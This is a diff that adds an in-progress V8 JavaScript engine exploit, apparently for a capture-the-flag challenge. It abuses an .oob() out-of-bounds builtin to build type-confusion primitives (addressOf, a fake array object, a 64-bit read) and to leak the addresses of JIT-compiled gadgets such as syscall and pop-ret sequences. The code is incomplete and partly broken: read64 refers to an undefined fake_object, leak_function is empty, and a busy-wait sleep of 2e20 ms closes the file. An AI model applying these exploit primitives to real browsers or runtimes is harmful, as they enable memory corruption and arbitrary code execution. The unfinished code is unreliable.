@@ -77,7 +77,86 @@ function jsc(var1, var2, var3, var4) {
 		f5ac3(var1, var2, var3, var4);
 		f5ec3(var1, var2, var3, var4);
 	}
+}
+
+
+function sleep(n) {
+	var start = new Date().getTime();
+	//  console.log('休眠前：' + start);
+	while (true) {
+		if (new Date().getTime() - start > n) {
+			break;
+		}
+	}
+}
+
+// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
+var buf =new ArrayBuffer(16);
+var float64 = new Float64Array(buf);
+var bigUint64 = new BigUint64Array(buf);
+// 浮点数转换为64位无符号整数
+
+function f2i(f)
+{
+    float64[0] = f;
+    return bigUint64[0];
+}
+// 64位无符号整数转为浮点数
+function i2f(i)
+{
+    bigUint64[0] = i;
+    return float64[0];
+}
+
+function hex(i)
+{
+    return i.toString(16).padStart(16, "0");
+}
+
+var obj = {"a": 1};
+var obj_array = [obj];
+var float_array = [1.1];
+var obj_array_map = obj_array.oob();
+var float_array_map = float_array.oob();
+var fake_array = [
+	float_array_map,
+	i2f(0n),
+	i2f(0x41414141n),
+	i2f(0x1000000000n),
+	1.1,
+	2.2
+];
+
+function read64(addr)
+{
+	fake_array[2] = i2f(addr + 0x1n - 0x10n);// 传入地址+1变成指针，因为elements属性前面还有map和length占0x10个字节，所以要先扣除
+	var leak_info = f2i(fake_object[0]);
+	console.log("[*] leak addr: 0x" + hex(addr) + " data: 0x" + hex(leak_info));
+	return leak_info;
+}
+
+function addressOf(obj_to_leak)
+{
+    obj_array[0] = obj_to_leak;
+    obj_array.oob(float_array_map);
+	var ret = f2i(obj_array[0]);
+	obj_array.oob(obj_array_map);
+	return ret - 1n;
+}
+
+function leak_function(addr)
+{
 
 }
 
 jsc(0xc35, 0xc22, 0xc32, 0xc55);
+
+console.log("[*] leak gadget 0f05 addr: 0x" + hex(addressOf(f0f05)));
+%DebugPrint(f0f05);
+console.log("[*] leak gadget 5ac3 addr: 0x" + hex(addressOf(f5ac3)));
+console.log("[*] leak gadget 5ec3 addr: 0x" + hex(addressOf(f5ec3)));
+console.log("[*] leak gadget 5fc3 addr: 0x" + hex(addressOf(f5fc3)));
+console.log("[*] leak gadget 58c3 addr: 0x" + hex(addressOf(f58c3)));
+
+sleep(2e20);
+console.log('hello world');
